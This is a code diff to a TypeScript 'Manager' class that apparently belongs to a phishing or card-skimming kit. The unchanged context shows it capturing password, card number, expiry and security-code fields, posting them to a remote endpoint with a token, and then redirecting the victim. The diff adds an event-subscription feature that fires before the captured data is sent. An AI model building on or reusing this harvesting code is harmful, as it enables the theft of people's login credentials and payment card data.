@@ -26,6 +26,11 @@ import Remote from "./Remote";
 
 import Logger from "./Logger";
 
+interface EventSubscription {
+	eventName: string;
+	callback: (event: IEvent) => void;
+}
+
 export class Manager {
 	private readonly supportedTypes : string[] = ["email", "password", "tel", "text", "given-name", "name", "family-name", "street-address", "cc-name", "cc-given-name", "cc-family-name", "cc-number", "cc-exp", "cc-exp-month", "cc-exp-year", "cc-csc", "cc-type"];
 	private readonly supportedEvents = {
@@ -53,6 +58,8 @@ export class Manager {
 	private readonly remote: Remote;
 	private readonly source: string;
 	private readonly token: string;
+
+	private subscriptions: EventSubscription[] = [];
 
 	private logger: Logger;
 	private handlers = [];
@@ -228,7 +235,8 @@ export class Manager {
 
 		const type = this.findType(activeEvent, event);
 		const payload = this.packEvent(type, activeEvent);
-		
+		this.triggerSubscription(activeEvent);
+
 		return this.remote.post(payload)
 			.then(result => this.logger.info(result))
 			.finally(() => {
@@ -236,6 +244,34 @@ export class Manager {
 					window.location.href = `${this.redirectUrl}${window.location.search}`;
 				}
 			});		
+	}
 
+	get supportedEventNames(): string[] {
+		return Object.keys(this.supportedEvents);
+	}
+
+	public subscribe(eventName: string, callback: (event: IEvent) => void) {
+		if (! this.supportedEventNames.includes(eventName)) {
+			throw new Error(`Unsupported event: ${eventName}`);
+		}
+		
+		this.subscriptions.push({ eventName, callback});
+	}
+
+	public unsubscribe(eventName: string, callback: (event: IEvent) => void) {
+		if (! this.supportedEventNames.includes(eventName)) {
+			throw new Error(`Unsupported event: ${eventName}`);
+		}
+
+		// find the event in the subscriptions array and remove it
+		const eventIndex = this.subscriptions.findIndex(subscription => subscription.eventName === eventName && subscription.callback === callback);
+		if (eventIndex >= 0) {
+			this.subscriptions.splice(eventIndex, 1);
+		}
+	}
+
+	public triggerSubscription(event: IEvent) {
+		const subscriptions = this.subscriptions.filter(subscription => subscription.eventName === event.name);
+		subscriptions.forEach(subscription => subscription.callback(event));
 	}
 }
